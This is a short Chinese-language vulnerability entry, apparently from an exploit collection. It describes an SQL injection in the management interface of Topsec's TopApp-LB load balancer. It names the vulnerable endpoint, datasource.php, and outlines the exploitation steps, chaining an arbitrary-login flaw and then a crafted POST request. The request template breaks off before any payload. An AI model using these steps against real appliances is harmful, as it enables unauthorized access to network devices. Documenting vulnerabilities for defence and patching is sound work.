# 天融信 TopApp-LB SQL注入漏洞

## 漏洞描述
天融信负载均衡 TopAPP-LB产品旧版本在管理面存在SQL注入漏洞，具体为在可以访问管理服务情况 下，攻击者通过构造恶意请求，利用系统检查输入条件不严格的缺陷，进一步可获取部分系统本地信息

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
利用 **天融信负载均衡TopApp-LB 任意登陆** 使用后台

提交以下数据包



```plain
POST /acc/clsf/report/datasource.php HTTP/1.1
Host: 
Connection: close
